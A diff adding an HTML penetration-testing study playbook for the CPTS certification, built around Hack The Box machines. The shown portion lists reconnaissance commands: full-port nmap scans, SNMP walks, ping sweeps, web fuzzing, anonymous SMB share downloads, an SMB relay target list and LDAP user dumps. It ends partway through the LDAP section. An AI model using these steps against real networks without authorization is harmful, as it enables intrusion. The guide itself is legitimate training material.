@@ -1,0 +1,1499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CPTS Ultimate Playbook — HTB Machines</title>
+<style>
+  :root{
+    --bg:#0a0e14; --bg2:#0f141c; --panel:#121822; --panel2:#161d29;
+    --border:#1f2937; --border2:#2a3548;
+    --text:#e6edf3; --muted:#8b949e; --dim:#5c6675;
+    --accent:#7ee787; --accent2:#58a6ff; --warn:#f0883e; --danger:#ff7b72;
+    --purple:#bc8cff; --yellow:#e3b341; --cyan:#39d2c0;
+    --code-bg:#0d1117; --code-border:#21262d;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;
+    background:var(--bg);color:var(--text);line-height:1.6;
+    font-size:15px;
+  }
+  ::selection{background:var(--accent);color:#000}
+  /* Scrollbar */
+  ::-webkit-scrollbar{width:10px;height:10px}
+  ::-webkit-scrollbar-track{background:var(--bg2)}
+  ::-webkit-scrollbar-thumb{background:#2a3548;border-radius:5px}
+  ::-webkit-scrollbar-thumb:hover{background:#3a4a64}
+
+  /* Layout */
+  .app{display:grid;grid-template-columns:280px 1fr;min-height:100vh}
+  .sidebar{
+    background:var(--bg2);border-right:1px solid var(--border);
+    position:sticky;top:0;height:100vh;overflow-y:auto;padding:18px 0;
+  }
+  .main{padding:0;min-width:0}
+
+  /* Header */
+  .topbar{
+    position:sticky;top:0;z-index:50;
+    background:rgba(10,14,20,.92);backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--border);padding:14px 28px;
+    display:flex;align-items:center;gap:14px;flex-wrap:wrap;
+  }
+  .topbar h1{font-size:18px;font-weight:600;letter-spacing:-.3px}
+  .topbar h1 span{color:var(--accent)}
+  .search{
+    flex:1;min-width:240px;position:relative;
+  }
+  .search input{
+    width:100%;background:var(--panel);border:1px solid var(--border2);
+    color:var(--text);padding:9px 14px 9px 38px;border-radius:8px;font-size:14px;
+    outline:none;transition:border .15s;
+  }
+  .search input:focus{border-color:var(--accent2)}
+  .search svg{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--muted)}
+  .filter-chips{display:flex;gap:6px;flex-wrap:wrap}
+  .chip{
+    background:var(--panel);border:1px solid var(--border2);color:var(--muted);
+    padding:5px 11px;border-radius:14px;font-size:12px;cursor:pointer;transition:.15s;
+    user-select:none;
+  }
+  .chip:hover{color:var(--text);border-color:#3a4a64}
+  .chip.active{background:var(--accent);color:#000;border-color:var(--accent)}
+
+  /* Sidebar */
+  .side-title{
+    font-size:11px;text-transform:uppercase;letter-spacing:1.5px;
+    color:var(--dim);padding:8px 22px;margin-top:8px;
+  }
+  .side-link{
+    display:flex;align-items:center;gap:10px;padding:8px 22px;
+    color:var(--muted);text-decoration:none;font-size:14px;border-left:2px solid transparent;
+    transition:.12s;
+  }
+  .side-link:hover{color:var(--text);background:rgba(126,231,135,.04)}
+  .side-link.active{color:var(--accent);border-left-color:var(--accent);background:rgba(126,231,135,.06)}
+  .side-link .dot{width:6px;height:6px;border-radius:50%;background:currentColor;opacity:.7}
+  .side-link .count{margin-left:auto;font-size:11px;color:var(--dim);background:var(--panel);padding:1px 7px;border-radius:10px}
+
+  /* Content */
+  .content{padding:28px;max-width:1280px;margin:0 auto}
+  .section{margin-bottom:48px;scroll-margin-top:80px}
+  .section-header{
+    display:flex;align-items:baseline;gap:14px;margin-bottom:6px;padding-bottom:12px;
+    border-bottom:1px solid var(--border);
+  }
+  .section-header h2{font-size:24px;font-weight:600;letter-spacing:-.5px}
+  .section-header .tagline{color:var(--muted);font-size:13px}
+  .section-intro{color:var(--muted);font-size:14px;margin:14px 0 22px}
+
+  /* Cards */
+  .card{
+    background:var(--panel);border:1px solid var(--border);border-radius:12px;
+    margin-bottom:18px;overflow:hidden;transition:border-color .15s;
+  }
+  .card:hover{border-color:var(--border2)}
+  .card-head{
+    padding:16px 20px;display:flex;align-items:flex-start;gap:14px;
+    border-bottom:1px solid var(--border);cursor:pointer;
+  }
+  .card-head h3{font-size:16px;font-weight:600;letter-spacing:-.2px;margin-bottom:3px}
+  .card-head .desc{color:var(--muted);font-size:13px}
+  .card-head .machines{margin-left:auto;display:flex;gap:5px;flex-wrap:wrap;justify-content:flex-end;max-width:50%}
+  .mach{
+    font-size:11px;padding:2px 8px;border-radius:10px;background:var(--panel2);
+    color:var(--cyan);border:1px solid var(--border2);font-family:ui-monospace,monospace;
+  }
+  .mach.win{color:var(--accent2)}
+  .mach.linux{color:var(--warn)}
+  .card-body{padding:18px 20px;display:none}
+  .card.open .card-body{display:block}
+  .card-head .chev{margin-left:auto;color:var(--muted);transition:transform .2s;flex-shrink:0}
+  .card.open .card-head .chev{transform:rotate(90deg)}
+  .card-head .machines{margin-left:auto;margin-right:10px}
+
+  .step{
+    background:var(--bg2);border-left:3px solid var(--accent2);
+    padding:12px 16px;margin:10px 0;border-radius:0 8px 8px 0;
+  }
+  .step-num{
+    display:inline-block;background:var(--accent2);color:#000;
+    width:22px;height:22px;border-radius:50%;text-align:center;line-height:22px;
+    font-size:12px;font-weight:700;margin-right:8px;
+  }
+  .step-title{font-weight:600;font-size:14px;color:var(--text)}
+  .step-detail{color:var(--muted);font-size:13px;margin:6px 0 8px}
+  .step-detail b{color:var(--text)}
+  .step-detail .req{color:var(--yellow)}
+  .step-detail .next{color:var(--accent)}
+
+  /* Code blocks */
+  pre{
+    background:var(--code-bg);border:1px solid var(--code-border);
+    border-radius:7px;padding:12px 14px;overflow-x:auto;
+    font-family:'JetBrains Mono','Fira Code',ui-monospace,monospace;
+    font-size:12.5px;line-height:1.65;color:#c9d1d9;margin:8px 0;position:relative;
+  }
+  pre .cmt{color:#8b949e}
+  pre .cmd{color:var(--accent)}
+  pre .arg{color:var(--accent2)}
+  pre .val{color:var(--yellow)}
+  pre .str{color:var(--purple)}
+  pre .pipe{color:var(--cyan)}
+  code.inline{
+    background:var(--code-bg);border:1px solid var(--code-border);
+    padding:1px 6px;border-radius:4px;font-family:ui-monospace,monospace;
+    font-size:12.5px;color:var(--accent);
+  }
+  .copy-btn{
+    position:absolute;top:6px;right:6px;background:var(--panel2);
+    border:1px solid var(--border2);color:var(--muted);
+    padding:3px 9px;border-radius:5px;font-size:11px;cursor:pointer;opacity:0;transition:.15s;
+  }
+  pre:hover .copy-btn{opacity:1}
+  .copy-btn:hover{color:var(--accent);border-color:var(--accent)}
+
+  /* Phase label */
+  .phase{
+    display:inline-block;font-size:10px;letter-spacing:1px;text-transform:uppercase;
+    padding:2px 8px;border-radius:4px;margin-right:6px;font-weight:700;
+  }
+  .phase.enum{background:rgba(88,166,255,.15);color:var(--accent2)}
+  .phase.exploit{background:rgba(255,123,114,.15);color:var(--danger)}
+  .phase.privesc{background:rgba(240,136,62,.15);color:var(--warn)}
+  .phase.lateral{background:rgba(188,140,255,.15);color:var(--purple)}
+  .phase.cred{background:rgba(227,179,65,.15);color:var(--yellow)}
+  .phase.persist{background:rgba(57,210,192,.15);color:var(--cyan)}
+
+  /* Tools grid */
+  .tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-bottom:20px}
+  .tool{
+    background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:10px 12px;
+    transition:.15s;
+  }
+  .tool:hover{border-color:var(--accent2);transform:translateY(-1px)}
+  .tool .tname{font-family:ui-monospace,monospace;color:var(--accent);font-size:13px;font-weight:600}
+  .tool .tdesc{color:var(--muted);font-size:11.5px;margin-top:2px}
+
+  /* TOC quick nav */
+  .pill-row{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:18px}
+  .pill{
+    background:var(--panel);border:1px solid var(--border2);color:var(--text);
+    padding:6px 12px;border-radius:18px;font-size:12.5px;text-decoration:none;
+    transition:.15s;display:inline-flex;align-items:center;gap:6px;
+  }
+  .pill:hover{border-color:var(--accent);color:var(--accent);transform:translateY(-1px)}
+
+  /* Highlights */
+  .note{
+    background:rgba(88,166,255,.06);border-left:3px solid var(--accent2);
+    padding:10px 14px;border-radius:0 6px 6px 0;margin:10px 0;font-size:13px;
+  }
+  .warn-note{
+    background:rgba(240,136,62,.06);border-left:3px solid var(--warn);
+    padding:10px 14px;border-radius:0 6px 6px 0;margin:10px 0;font-size:13px;color:var(--warn);
+  }
+  .danger-note{
+    background:rgba(255,123,114,.06);border-left:3px solid var(--danger);
+    padding:10px 14px;border-radius:0 6px 6px 0;margin:10px 0;font-size:13px;color:var(--danger);
+  }
+
+  /* Footer */
+  footer{
+    border-top:1px solid var(--border);padding:24px 28px;color:var(--dim);
+    font-size:12px;text-align:center;
+  }
+  .hide{display:none !important}
+
+  /* Responsive */
+  @media(max-width:900px){
+    .app{grid-template-columns:1fr}
+    .sidebar{position:fixed;left:-280px;width:280px;z-index:100;transition:.2s}
+    .sidebar.open{left:0}
+    .menu-btn{display:inline-block !important}
+  }
+  .menu-btn{display:none;background:var(--panel);border:1px solid var(--border2);color:var(--text);padding:7px 11px;border-radius:7px;cursor:pointer;font-size:14px}
+</style>
+</head>
+<body>
+
+<div class="app">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar" id="sidebar">
+    <div style="padding:0 22px 14px">
+      <div style="font-size:16px;font-weight:700;letter-spacing:-.5px">
+        <span style="color:var(--accent)">⌬</span> CPTS Playbook
+      </div>
+      <div style="color:var(--dim);font-size:11px;margin-top:2px">HTB Track • 23 Machines</div>
+    </div>
+
+    <div class="side-title">Recon & Enumeration</div>
+    <a class="side-link" data-nav="nmap"><span class="dot" style="color:var(--accent2)"></span>Nmap & Port Scan<span class="count">23</span></a>
+    <a class="side-link" data-nav="web-enum"><span class="dot" style="color:var(--accent2)"></span>Web Enumeration<span class="count">15</span></a>
+    <a class="side-link" data-nav="smb"><span class="dot" style="color:var(--accent2)"></span>SMB Enumeration<span class="count">9</span></a>
+    <a class="side-link" data-nav="ldap"><span class="dot" style="color:var(--accent2)"></span>LDAP / AD Enum<span class="count">14</span></a>
+    <a class="side-link" data-nav="dns"><span class="dot" style="color:var(--accent2)"></span>DNS Enumeration<span class="count">6</span></a>
+    <a class="side-link" data-nav="bloodhound"><span class="dot" style="color:var(--accent2)"></span>BloodHound / SharpHound<span class="count">12</span></a>
+
+    <div class="side-title">Initial Access</div>
+    <a class="side-link" data-nav="web-exploit"><span class="dot" style="color:var(--danger)"></span>Web Exploitation<span class="count">11</span></a>
+    <a class="side-link" data-nav="sqli"><span class="dot" style="color:var(--danger)"></span>SQL Injection<span class="count">7</span></a>
+    <a class="side-link" data-nav="file-upload"><span class="dot" style="color:var(--danger)"></span>File Upload / LFI<span class="count">5</span></a>
+    <a class="side-link" data-nav="password-spray"><span class="dot" style="color:var(--danger)"></span>Password Spraying<span class="count">8</span></a>
+
+    <div class="side-title">AD / Kerberos Attacks</div>
+    <a class="side-link" data-nav="asrep"><span class="dot" style="color:var(--purple)"></span>AS-REP Roasting<span class="count">6</span></a>
+    <a class="side-link" data-nav="kerberoast"><span class="dot" style="color:var(--purple)"></span>Kerberoasting<span class="count">9</span></a>
+    <a class="side-link" data-nav="dcsync"><span class="dot" style="color:var(--purple)"></span>DCSync<span class="count">8</span></a>
+    <a class="side-link" data-nav="delegation"><span class="dot" style="color:var(--purple)"></span>Delegation Attacks<span class="count">5</span></a>
+    <a class="side-link" data-nav="adcs"><span class="dot" style="color:var(--purple)"></span>ADCS / ESC1-15<span class="count">7</span></a>
+    <a class="side-link" data-nav="acl"><span class="dot" style="color:var(--purple)"></span>ACL Abuse<span class="count">10</span></a>
+    <a class="side-link" data-nav="gpo"><span class="dot" style="color:var(--purple)"></span>GPO / OU Abuse<span class="count">4</span></a>
+
+    <div class="side-title">Credential Access</div>
+    <a class="side-link" data-nav="lsass"><span class="dot" style="color:var(--yellow)"></span>LSASS Dumping<span class="count">11</span></a>
+    <a class="side-link" data-nav="ntds"><span class="dot" style="color:var(--yellow)"></span>NTDS.dit Extraction<span class="count">6</span></a>
+    <a class="side-link" data-nav="sam"><span class="dot" style="color:var(--yellow)"></span>SAM / LSA Secrets<span class="count">5</span></a>
+    <a class="side-link" data-nav="pth"><span class="dot" style="color:var(--yellow)"></span>Pass-the-Hash / Ticket<span class="count">12</span></a>
+    <a class="side-link" data-nav="dpapi"><span class="dot" style="color:var(--yellow)"></span>DPAPI / Vault<span class="count">3</span></a>
+
+    <div class="side-title">Privilege Escalation</div>
+    <a class="side-link" data-nav="win-privesc"><span class="dot" style="color:var(--warn)"></span>Windows PrivEsc<span class="count">14</span></a>
+    <a class="side-link" data-nav="linux-privesc"><span class="dot" style="color:var(--warn)"></span>Linux PrivEsc<span class="count">6</span></a>
+    <a class="side-link" data-nav="seimpersonate"><span class="dot" style="color:var(--warn)"></span>SeImpersonate / Potato<span class="count">7</span></a>
+    <a class="side-link" data-nav="sccm"><span class="dot" style="color:var(--warn)"></span>SCCM / MECM Abuse<span class="count">3</span></a>
+
+    <div class="side-title">Lateral & Pivoting</div>
+    <a class="side-link" data-nav="lateral"><span class="dot" style="color:var(--cyan)"></span>Lateral Movement<span class="count">15</span></a>
+    <a class="side-link" data-nav="pivot"><span class="dot" style="color:var(--cyan)"></span>Tunneling / Pivots<span class="count">10</span></a>
+    <a class="side-link" data-nav="winrm"><span class="dot" style="color:var(--cyan)"></span>WinRM / WMI / PSExec<span class="count">12</span></a>
+
+    <div class="side-title">Reference</div>
+    <a class="side-link" data-nav="tools"><span class="dot" style="color:var(--accent)"></span>All Tools<span class="count">60+</span></a>
+    <a class="side-link" data-nav="machines"><span class="dot" style="color:var(--accent)"></span>Machine Index<span class="count">23</span></a>
+    <a class="side-link" data-nav="checklist"><span class="dot" style="color:var(--accent)"></span>Exam Checklist<span class="count">★</span></a>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="main">
+    <div class="topbar">
+      <button class="menu-btn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <h1>CPTS <span>Playbook</span></h1>
+      <div class="search">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
+        <input type="text" id="search" placeholder="Search technique, tool, command, machine… (e.g. kerberoasting, crackmapexec, forest)">
+      </div>
+      <div class="filter-chips">
+        <span class="chip active" data-filter="all">All</span>
+        <span class="chip" data-filter="windows">Windows</span>
+        <span class="chip" data-filter="linux">Linux</span>
+        <span class="chip" data-filter="ad">AD</span>
+      </div>
+    </div>
+
+    <div class="content">
+
+      <div class="pill-row" style="margin-bottom:8px">
+        <a class="pill" href="#checklist">★ Exam Checklist</a>
+        <a class="pill" href="#tools">All Tools</a>
+        <a class="pill" href="#machines">Machine Index</a>
+        <a class="pill" href="#methodology">Methodology</a>
+      </div>
+
+      <!-- INTRO -->
+      <section class="section" id="intro">
+        <div class="section-header">
+          <h2>The CPTS Mindset</h2>
+          <span class="tagline">A guided walkthrough of every technique used across 23 HTB machines</span>
+        </div>
+        <p class="section-intro">
+          This playbook distills every tool, technique, command, and decision point encountered across 23 Hack The Box machines that mirror the CPTS syllabus. Each technique card lists: <b style="color:var(--accent)">what it does</b>, <b style="color:var(--accent2)">which machines use it</b>, <b style="color:var(--yellow)">prerequisite info</b> (credentials, enumeration, access), the <b>exact commands</b>, and <b style="color:var(--accent)">what to do next</b>. Treat this as your single-source reference for the exam.
+        </p>
+        <div class="note">
+          <b>Methodology in one line:</b> Enumerate → Correlate → Exploit → Dump creds → Pivot → Repeat. Never move past a host without dumping everything it offers.
+        </div>
+      </section>
+
+      <!-- METHODOLOGY -->
+      <section class="section" id="methodology">
+        <div class="section-header">
+          <h2>CPTS Attack Methodology</h2>
+        </div>
+        <p class="section-intro">Follow this loop on every host and subnet. The exam rewards depth, not speed.</p>
+
+        <div class="card open">
+          <div class="card-head"><div><h3>The 7-Phase Loop</h3><div class="desc">Applied to every machine and every internal subnet you pivot into</div></div></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Recon — Ports, services, versions, hostnames</span>
+              <div class="step-detail"><b>Inputs:</b> target IP / CIDR. <span class="req">Need:</span> nothing. <span class="next">Next:</span> build a service map.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmt"># Full TCP + top UDP + scripts + version</span>
+<span class="cmd">sudo nmap</span> <span class="arg">-p-</span> --min-rate 5000 -T4 <span class="arg">-sS -sV -sC -O</span> <span class="val">-oA full_tcp</span> <span class="val">10.10.11.x</span>
+<span class="cmd">sudo nmap</span> <span class="arg">-sU</span> --top-ports 200 <span class="arg">-sV</span> <span class="val">-oA udp_top</span> <span class="val">10.10.11.x</span>
+<span class="cmt"># Resolve hostnames (CRITICAL for AD)</span>
+<span class="cmd">sudo nmap</span> <span class="arg">-n</span> <span class="arg">-sn</span> <span class="val">10.10.11.0/24</span> <span class="pipe">|</span> <span class="cmd">tee</span> hosts.txt</pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Service-specific enumeration</span>
+              <div class="step-detail"><b>Inputs:</b> service map. <span class="req">Need:</span> ports identified. <span class="next">Next:</span> user lists, shares, AD objects, web paths.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmt"># SMB / LDAP / Web / DNS in parallel</span>
+<span class="cmd">crackmapexec smb</span> <span class="val">10.10.11.0/24</span>
+<span class="cmd">ldapsearch</span> <span class="arg">-x -H ldap://10.10.11.x -s base</span> <span class="str">'(objectclass=*)'</span>
+<span class="cmd">feroxbuster</span> <span class="arg">-u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-large.txt</span>
+<span class="cmd">gobuster vhost</span> <span class="arg">-u http://target -w subdomains.txt</span></pre>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Map the attack surface (correlate)</span>
+              <div class="step-detail">Build a mental graph: which users map to which services? Are there SPNs? AS-REP-roastable accounts? Writeable shares? GPOs you can edit? <span class="next">Next:</span> pick the weakest link.</div>
+            </div>
+            <div class="step"><span class="step-num">4</span><span class="step-title">Initial access / Foothold</span>
+              <div class="step-detail"><span class="req">Need:</span> enumerated weakness (CVE, default cred, misconfig, web vuln). <span class="next">Next:</span> drop a shell, escalate to a stable user.</div>
+            </div>
+            <div class="step"><span class="step-num">5</span><span class="step-title">Credential harvesting</span>
+              <div class="step-detail">Always dump <b>before</b> escalating. Read history files, LSASS, SAM, NTDS, DPAPI, browser vaults, config files, KeePass. <span class="next">Next:</span> spray creds across all services.</div>
+            </div>
+            <div class="step"><span class="step-num">6</span><span class="step-title">Privilege escalation</span>
+              <div class="step-detail"><span class="req">Need:</span> local shell. Check SeImpersonate, SeDebug, SeBackup, unquoted services, writable services, GPO, SCCM, ACL paths. <span class="next">Next:</span> SYSTEM / DA.</div>
+            </div>
+            <div class="step"><span class="step-num">7</span><span class="step-title">Lateral movement & pivoting</span>
+              <div class="step-detail"><span class="req">Need:</span> valid creds / hashes / tickets. Pivot via chisel/ligolo, move via PSExec/WMI/WinRM/RDP. <span class="next">Next:</span> repeat phase 1 on new subnet.</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- NMAP / RECON -->
+      <section class="section" id="nmap">
+        <div class="section-header"><h2>Nmap & Port Scanning</h2><span class="tagline">23 machines • Every engagement starts here</span></div>
+        <p class="section-intro">Always scan all 65535 TCP ports, plus top UDP. Use scripts (<code class="inline">-sC</code>) and version detection (<code class="inline">-sV</code>). For AD boxes, <b style="color:var(--warn)">hostname resolution is critical</b> — many Kerberos/SMB attacks fail without the FQDN in <code class="inline">/etc/hosts</code>.</p>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Fast full TCP scan with scripts</h3><div class="desc">Default starting scan on every box — Forest, Manager, Authority, Administrator, etc.</div></div><div class="machines"><span class="mach win">forest</span><span class="mach win">manager</span><span class="mach win">authority</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Run an all-ports TCP SYN scan</span>
+              <div class="step-detail"><b>Inputs:</b> target IP. <span class="req">Need:</span> root (for SYN scan). <span class="next">Next:</span> feed results into <code class="inline">-sC -sV</code> scan on open ports.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">sudo nmap</span> <span class="arg">-p- --min-rate 5000 -T4 -Pn -n</span> <span class="val">-oA allports</span> <span class="val">10.10.11.23</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Targeted deep scan on found ports</span>
+              <div class="step-detail"><b>Inputs:</b> list of open ports. <span class="next">Next:</span> examine script output for hostnames, SMB signing, Kerberos realm.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">nmap</span> <span class="arg">-p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389</span> \
+      <span class="arg">-sC -sV -Pn</span> <span class="val">-oA deep</span> <span class="val">10.10.11.23</span></pre>
+              <div class="note"><b>Why this matters:</b> The deep scan output reveals the AD domain (e.g., <code class="inline">FOREST.HTB LOCAL</code>), DNS domain, SMB signing status, and LDAP base DN — all required for downstream Kerberos/LDAP attacks.</div>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Add hostnames to /etc/hosts</span>
+              <div class="step-detail"><span class="req">Need:</span> hostname from nmap. <span class="next">Next:</span> AD attacks now resolve correctly.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">echo</span> <span class="str">"10.10.10.161 forest.htb FOREST"</span> <span class="pipe">|</span> <span class="cmd">sudo tee -a</span> /etc/hosts</pre>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>UDP scan for forgotten services</h3><div class="desc">UDP often exposes SNMP (161) which leaks AD users, processes, installed software</div></div><div class="machines"><span class="mach win">outdated</span><span class="mach win">snoopy</span><span class="mach linux">trick</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmd">sudo nmap</span> <span class="arg">-sU --top-ports 200 -sV -Pn</span> <span class="val">-oA udp</span> <span class="val">10.10.11.0/24</span>
+<span class="cmt"># If 161 open, walk SNMP strings</span>
+<span class="cmd">snmpwalk</span> <span class="arg">-v 2c -c public</span> <span class="val">10.10.11.x</span> <span class="pipe">|</span> <span class="cmd">tee</span> snmp.txt
+<span class="cmd">snmp-check</span> <span class="val">10.10.11.x</span> <span class="arg">-c public</span></pre>
+            <div class="note">On <b>Outdated</b>, SNMP leaked running processes which disclosed MSExchange patch level → CVE-2021-42321 path. On <b>Snoopy</b>, SNMP revealed custom user lists.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Internal host discovery via ping sweep</h3><div class="desc">Once you have a shell inside AD, enumerate the internal subnet</div></div><div class="machines"><span class="mach win">hospital</span><span class="mach win">administrator</span><span class="mach win">vintage</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Linux pivot</span>
+<span class="cmd">for i in</span> <span class="val">$(seq 1 254)</span>; <span class="cmd">do</span> <span class="cmd">ping</span> <span class="arg">-c 1 -W 1</span> <span class="val">10.10.11.$i</span> <span class="pipe">|</span> <span class="cmd">grep</span> <span class="str">"bytes from"</span>; <span class="cmd">done</span>
+<span class="cmt"># Windows pivot (PowerShell)</span>
+<span class="val">1..254</span> <span class="pipe">|</span> <span class="cmd">ForEach-Object</span> { <span class="cmd">Test-Connection</span> <span class="arg">-Count 1 -Quiet</span> <span class="val">10.10.11.$_</span> }
+<span class="cmt"># Or via nmap through a proxy (proxychains)</span>
+<span class="cmd">proxychains nmap</span> <span class="arg">-sn -Pn</span> <span class="val">10.10.11.0/24</span></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- WEB ENUM -->
+      <section class="section" id="web-enum">
+        <div class="section-header"><h2>Web Enumeration</h2><span class="tagline">15 machines • feroxbuster, gobuster, ffuf, wfuzz</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Directory & file discovery</h3><div class="desc">Find hidden paths, config files, admin panels, backup archives</div></div><div class="machines"><span class="mach win">streamio</span><span class="mach win">pov</span><span class="mach linux">trick</span><span class="mach win">ghost</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Run recursive content discovery</span>
+              <div class="step-detail"><span class="req">Need:</span> URL + wordlist. <span class="next">Next:</span> investigate anything returning 200/301/401/403.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">feroxbuster</span> <span class="arg">-u http://target.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,asp,aspx,jsp,html,txt,bak -t 50 -C 404</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Vhost / subdomain enumeration</span>
+              <div class="step-detail"><span class="req">Need:</span> target has wildcard DNS or returns different response for unknown vhost. <span class="next">Next:</span> add found vhosts to /etc/hosts and re-enumerate.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">ffuf</span> <span class="arg">-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://target.htb -H "Host: FUZZ.target.htb" -fs 10918</span>
+<span class="cmd">gobuster vhost</span> <span class="arg">-u http://target.htb -w subdomains.txt -t 50 --append-domain</span></pre>
+              <div class="note">On <b>Trick</b>, vhost <code>preprod-marketo.trick.htb</code> exposed a separate app with SSRF. On <b>StreamIO</b>, vhost <code>watch.streamio.htb</code> exposed an LFI.</div>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Identify tech stack</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">whatweb</span> <span class="val">http://target.htb</span>
+<span class="cmd">curl</span> <span class="arg">-sI</span> <span class="val">http://target.htb</span></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- SMB -->
+      <section class="section" id="smb">
+        <div class="section-header"><h2>SMB Enumeration</h2><span class="tagline">9 machines • smbclient, crackmapexec, smbmap</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>List and access SMB shares anonymously</h3><div class="desc">Null sessions still work on many boxes — find readable shares, retrieve files</div></div><div class="machines"><span class="mach win">jeeves</span><span class="mach win">forest</span><span class="mach win">manager</span><span class="mach win">snoopy</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">List shares with null auth</span>
+              <div class="step-detail"><span class="req">Need:</span> SMB port open. <span class="next">Next:</span> enumerate each non-default share.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">smbclient</span> <span class="arg">-L //target -N</span>   <span class="cmt"># null session</span>
+<span class="cmd">smbmap</span> <span class="arg">-H target -u '' -p ''</span>
+<span class="cmd">crackmapexec smb</span> <span class="val">target</span> <span class="arg">-u '' -p '' --shares</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Connect & recursively download</span>
+              <div class="step-detail"><span class="next">Next:</span> inspect downloaded files for creds, configs, backups.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">smbclient</span> <span class="arg">//target/share -N</span>
+smb: \&gt; <span class="cmd">recurse ON</span>
+smb: \&gt; <span class="cmd">prompt OFF</span>
+smb: \&gt; <span class="cmd">mget *</span>
+<span class="cmt"># Or recursively download via smbmap</span>
+<span class="cmd">smbmap</span> <span class="arg">-H target -u 'guest' -r 'share' -R</span></pre>
+              <div class="note">On <b>Jeeves</b>, an open SMB share exposed <code>Invoice.pdf</code> and a KeePass DB. On <b>Manager</b>, share enumeration led to a backup web config with SQL creds.</div>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Check SMB signing status</span>
+              <div class="step-detail">If signing is <b>not required</b>, you can perform SMB relay attacks.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">crackmapexec smb</span> <span class="val">10.10.11.0/24</span> <span class="arg">--gen-relay-list targets.txt</span>
+<span class="cmd">nmap</span> <span class="arg">-p 445 --script smb-security-mode,smb2-security-mode</span> <span class="val">target</span></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- LDAP -->
+      <section class="section" id="ldap">
+        <div class="section-header"><h2>LDAP / Active Directory Enumeration</h2><span class="tagline">14 machines • ldapsearch, windapsearch, bloodhound, PowerView</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Enumerate users, groups, SPNs, ACLs via LDAP</h3><div class="desc">The backbone of AD recon — pull every user, group, computer, and trust</div></div><div class="machines"><span class="mach win">forest</span><span class="mach win">authority</span><span class="mach win">vintage</span><span class="mach win">administrator</span><span class="mach win">redelegate</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Identify the domain & base DN</span>
+              <div class="step-detail"><span class="req">Need:</span> domain name (from nmap SMB/LDAP output). <span class="next">Next:</span> build full LDAP queries.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">ldapsearch</span> <span class="arg">-x -H ldap://target -s base</span> <span class="str">"(objectclass=*)"</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Dump all users with attributes</span>
+              <div class="step-detail"><span class="next">Next:</span> identify service accounts (SPN set), disabled accounts, password-not-required accounts, descriptions with creds.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">ldapsearch</span> <span class="arg">-x -H ldap://target -b 'DC=forest,DC=htb,DC=local'</span> \
+  <span class="str">'(objectCategory=person)'</span> sAMAccountName memberOf description servicePrincipalName userAccountControl <span class="pipe">|</span> <span class="cmd">tee</span> users.ldif</pre>
+              <div class="note">On <b>Forest</b>, this revealed user <code>s svc-alfresco</code> with description containing notes. On <b>Authority</b>, LDAP disclosed the SCCM NAA account.</div>
+            </div>
